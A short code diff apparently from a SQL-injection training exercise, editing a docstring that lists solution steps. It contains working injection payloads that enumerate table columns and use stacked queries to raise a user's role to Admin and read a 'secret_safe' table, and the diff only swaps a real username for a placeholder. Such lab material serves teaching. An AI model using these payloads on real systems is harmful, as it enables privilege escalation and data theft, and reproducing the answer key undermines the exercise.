@@ -371,7 +371,7 @@ def seventh_problem(request):
     1'; select * from information_schema.columns where table_name='db_users' --#
 
     Step #3: Update user privileges, then try to access the secret_safe
-    a'; UPDATE db_users SET role = 'Admin' WHERE db_users.username = 'ariel'; select * from db_users; select prize from secret_safe where 1=1 --#
+    a'; UPDATE db_users SET role = 'Admin' WHERE db_users.username = 'YOUR_USERNAME'; select * from db_users; select prize from secret_safe where 1=1 --#
 '''
 
 
